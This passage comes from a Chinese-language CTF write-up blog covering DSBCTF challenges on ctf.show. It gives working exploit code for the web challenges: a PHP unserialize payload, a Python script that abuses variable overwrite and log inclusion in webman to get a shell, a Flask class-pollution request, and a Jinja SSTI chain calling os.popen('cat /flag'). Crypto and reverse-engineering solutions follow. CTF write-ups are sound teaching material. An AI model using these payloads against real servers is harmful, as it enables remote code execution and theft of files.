class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;dsbctf&quot;</span>]);<br></code></pre></td></tr></table></figure><p>简单的分析一下就是传参进行比较，就可以得到flag了</p><p>考察的知识点是PHP特殊浮点常量INF和NAN</p><p>对于<code>d</code>,<code>s</code>,<code>b</code>传入三个不同的值，互不相等，拼接起来之后不于<code>ctf</code>的值相等，但是两者的MD5值强等于</p><p><code>INF</code>和<code>NAN</code>这两个常量转化为字符串类型之后的MD5值和原先的浮点类型MD5值相等，由于类型不相等，长度均为3，可以满足条件绕过，根据所有条件的限制，最后上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$d</span> = <span class="hljs-string">&#x27;I&#x27;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;N&#x27;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;F&#x27;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$ctf</span> = INF;<br>    &#125;<br><span class="hljs-variable">$exp</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><h3 id="迷雾重重"><a class="markdownIt-Anchor" href="#迷雾重重"></a> 迷雾重重</h3><p>先看题目的控制器的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">support</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">support</span>\<span class="hljs-title">exception</span>\<span class="hljs-title">BusinessException</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index/index&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testUnserialize</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> !== <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>))&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>);<br>            <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unserialize测试完毕&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testJson</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> !== <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>))&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>),<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span>!== <span class="hljs-variable">$data</span> &amp;&amp; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-string">&#x27;guest&#x27;</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index/view&#x27;</span>, <span class="hljs-variable">$data</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;json_decode测试完毕&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testSession</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span>&#123;<br>        <span class="hljs-variable">$session</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">session</span>();<br>        <span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&quot;guest&quot;</span>);<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;session测试完毕 username: &quot;</span>.<span class="hljs-variable">$data</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testException</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>))&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">&quot;业务异常 &quot;</span>.<span class="hljs-variable">$data</span>,<span class="hljs-number">3000</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;exception测试完毕&quot;</span>;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>看起来像是反序列化和session的题目，but不是，漏洞应该在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testJson</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span>&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> !== <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>))&#123;<br>           <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;data&#x27;</span>),<span class="hljs-literal">true</span>);<br>           <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span>!== <span class="hljs-variable">$data</span> &amp;&amp; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-string">&#x27;guest&#x27;</span>)&#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index/view&#x27;</span>, <span class="hljs-variable">$data</span>);<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;json_decode测试完毕&quot;</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>跟踪一下在这里的raw.php文件的第68行内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">\vendor\workerman\webman-framework\src\support\view<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$request</span>-&gt;_view_vars)) &#123;<br>            <span class="hljs-title function_ invoke__">extract</span>((<span class="hljs-keyword">array</span>)<span class="hljs-variable">$request</span>-&gt;_view_vars);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$vars</span>);<br>        <span class="hljs-title function_ invoke__">ob_start</span>();<br>        <span class="hljs-comment">// Try to include php file.</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable">$__template_path__</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>            <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p><code>$var</code>就是<code>view</code>方法的第二个参数，污染和过滤 直接导入符号表 形成变量覆盖的漏洞，需要覆盖<code>$__template_path__</code>就行了</p><p>不存在阿帕奇和nginx，排除日志包含，不是session的竞争</p><p>官p的解释是包含框架日志文件，包含<code>php</code>代码会导致<code>include</code>失败，从而将报错信息不<code>urlencode</code>情况下，写入日志文件，正好包含<code>getshell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># 注意 这里题目地址 应该https换成http</span><br>url = <span class="hljs-string">&quot;http://7a0ef514-570f-49b8-814a-fba44caa91cc.challenge.ctf.show/&quot;</span><br><br><br><span class="hljs-comment"># Author: ctfshow h1xa</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_webroot</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Getting webroot...&quot;</span>)<br><br>    webroot = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">300</span>):<br>        r = requests.get(<br>            url=url + <span class="hljs-string">&#x27;index/testJson?data=&#123;&#123;&quot;name&quot;: &quot;guest&quot;, &quot;__template_path__&quot;: &quot;/proc/&#123;&#125;/cmdline&quot;&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i))<br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;start.php&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[\033[31m*\033[0m] Found start.php at /proc/<span class="hljs-subst">&#123;i&#125;</span>/cmdline&quot;</span>)<br>            webroot = r.text.split(<span class="hljs-string">&quot;start_file=&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">10</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found webroot: <span class="hljs-subst">&#123;webroot&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> webroot<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_shell</span>(<span class="hljs-params">webroot</span>):<br>    <span class="hljs-comment"># payload = &#x27;index/testJson?data=&#123;&#123;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;&lt;?php%20`ls%20/&gt;&#123;&#125;/public/ls.txt`;?&gt;&quot;&#125;&#125;&#x27;.format(webroot)</span><br>    payload = <span class="hljs-string">&#x27;index/testJson?data=&#123;&#123;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;&lt;?php%20`cat%20/s00*&gt;&#123;&#125;/public/flag.txt`;?&gt;&quot;&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        webroot)<br>    r = requests.get(url=url + payload)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">500</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[\033[31m*\033[0m] Shell sent successfully&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to send shell&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">include_shell</span>(<span class="hljs-params">webroot</span>):<br>    now = datetime.now()<br>    payload = <span class="hljs-string">&#x27;index/testJson?data=&#123;&#123;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;&#123;&#125;/runtime/logs/webman-&#123;&#125;-&#123;&#125;-&#123;&#125;.log&quot;&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        webroot, now.strftime(<span class="hljs-string">&quot;%Y&quot;</span>), now.strftime(<span class="hljs-string">&quot;%m&quot;</span>), now.strftime(<span class="hljs-string">&quot;%d&quot;</span>))<br>    r = requests.get(url=url + payload)<br>    time.sleep(<span class="hljs-number">5</span>)<br>    r = requests.get(url=url + <span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=================FLAG==================\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m&quot;</span> + r.text + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=================FLAG==================\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[\033[31m*\033[0m] Shell included successfully&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to include shell&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    webroot = get_webroot()<br>    send_shell(webroot)<br>    include_shell(webroot)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过遍历 /proc/&#123;i&#125;/cmdline，猜测每个进程的命令行内容，寻找包含 start.php 的进程。通过某些特定的进程或者系统服务来确定Web根目录<br>通过发送特制的payload，将恶意PHP代码注入到目标Web应用中。这个PHP代码会在服务器上执行命令并将结果写入到指定的文件中。<br>使用Web应用生成的日志文件来绕过可能的安全检查。通过让PHP代码被写入到日志文件中，并通过 include 机制被执行，从而获取敏感信息<br></code></pre></td></tr></table></figure><p>是没太懂</p><h3 id="ez_inject"><a class="markdownIt-Anchor" href="#ez_inject"></a> ez_inject</h3><p>先前端注册一个账户，进去发现没权限，发现有cookie值</p><p>用flask-unsign看一下内容</p><p><img src="/../../images/ctfshow/2024-11-13163245.png" alt="2024-11-13163245"></p><p>这里就写个非预期吧预期解可以看出题人的博客，下面是预期解</p><p><a href="https://baozongwi.xyz/2024/11/13/DSBCTF2024/#%E9%A2%84%E6%9C%9F">DSBCTF2024 | hacking the future (baozongwi.xyz)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&quot;http://694380d1-75a1-414d-b790-643f00f64178.challenge.ctf.show/register&quot;</span><br><br>payload=&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;orangee&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;orangee&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;app&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;/&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br>r = requests.post(url=url, json=payload)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>访问<code>/static/flag</code>就可以拿到答案了</p><h3 id="ezzz_ssti"><a class="markdownIt-Anchor" href="#ezzz_ssti"></a> ezzz_ssti</h3><p>先fenjing一下没出的来，只能手输入了，测试了一下有长度的限制</p><p>题解是利用config的update拼接得到的注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;config.update(a=lipsum.__globals__)&#125;&#125;<br>&#123;&#123;config.update(b=config.a.os.popen)&#125;&#125;<br>&#123;&#123;config.b(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="简单的文件上传"><a class="markdownIt-Anchor" href="#简单的文件上传"></a> 简单的文件上传</h2><p>题目描述：jre1.8 php7.2 不需要 扫描 爆破 竞争 盲注</p><ul><li>可以上传jar后缀文件</li><li>可以删除上传后的jar包</li><li>输入jar文件名称，可以执行jar包</li><li>执行后 有执行回显</li></ul><p><a href="https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e">‍‬﻿‌‬﻿‌⁠⁠⁠‍‍﻿﻿⁠⁠⁠⁠‬⁠⁠‍CTFshow DSBCTF 官方WP</a></p><p>剩下的看官p吧，不会java</p><hr><p>web复现了几点还是学到挺多知识的，其他方向的题我随缘写写。</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2><h3 id="签到一把梭"><a class="markdownIt-Anchor" href="#签到一把梭"></a> 签到·一把梭</h3><p>先正常的<code>long_to_bytes</code>然后写个脚本简单爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_eth_root</span>(<span class="hljs-params">c, e, n</span>):<br>    low = <span class="hljs-number">0</span><br>    high = n<br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(mid, e, n) == c:<br>            <span class="hljs-keyword">return</span> mid<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(mid, e, n) &lt; c:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>n = <span class="hljs-number">0x846d39bff2e430ce49d3230c7f00b81b23e4f0c733f7f52f6a5d32460e456e5f</span><br>c = <span class="hljs-number">0x4eeec51849a85e5a6566f8d73a74b1e64959aa893f98e01c1e02c3120496f8b1</span><br><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):<br>    <span class="hljs-keyword">try</span>:<br>        phi = (n-<span class="hljs-number">1</span>)<br>        e = <span class="hljs-built_in">pow</span>(d, -<span class="hljs-number">1</span>, phi)<br>        m = <span class="hljs-built_in">pow</span>(c, d, n)<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag.lower() <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;ctf&#x27;</span> <span class="hljs-keyword">in</span> flag.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found potential flag with d=<span class="hljs-subst">&#123;d&#125;</span>:&quot;</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h3 id="古典古典古典"><a class="markdownIt-Anchor" href="#古典古典古典"></a> 古典古典古典</h3><p>古典套题出到密码里我统一说烂，跟着写一遍</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">UUxRQjFBU19NWkFFe1pPX0xBMV9PMVVOU31OV05aX0IxSA==<br></code></pre></td></tr></table></figure><p>这个密文，先进行base64解密,得到这个</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QLQB1AS<span class="hljs-emphasis">_MZAE&#123;ZO_</span>LA1<span class="hljs-emphasis">_O1UNS&#125;NWNZ_</span>B1H<br></code></pre></td></tr></table></figure><p><strong>hint:</strong>{}位置对了就能出了吗?什么加密会保留{}位置</p><p>尝试栅栏密码，因为看着像</p><p>w型的栅栏得到了这个内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QZNALEW&#123;QZNOB<span class="hljs-emphasis">_ZL1A_</span>1A<span class="hljs-emphasis">_BOS11U_</span>NHSM&#125;<br></code></pre></td></tr></table></figure><p>发现不能得出还需要凯撒，进行mod19</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">XGUHSLD&#123;XGUVI<span class="hljs-emphasis">_GS1H_</span>1H<span class="hljs-emphasis">_IVZ11B_</span>UOZT&#125;<br></code></pre></td></tr></table></figure><p>最后进行atbash</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">CTFSHOW&#123;CTFER<span class="hljs-emphasis">_TH1S_</span>1S<span class="hljs-emphasis">_REA11Y_</span>FLAG&#125;<br></code></pre></td></tr></table></figure><p>评价就是纯烂，没新意</p><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2><h3 id="签到easyre"><a class="markdownIt-Anchor" href="#签到easyre"></a> 签到·easyRE</h3><p>找到对应的class，先base解密一下得到内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.security.SecureRandom;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">D8yDSBCTF</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">P3WSSK</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/ECB/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span 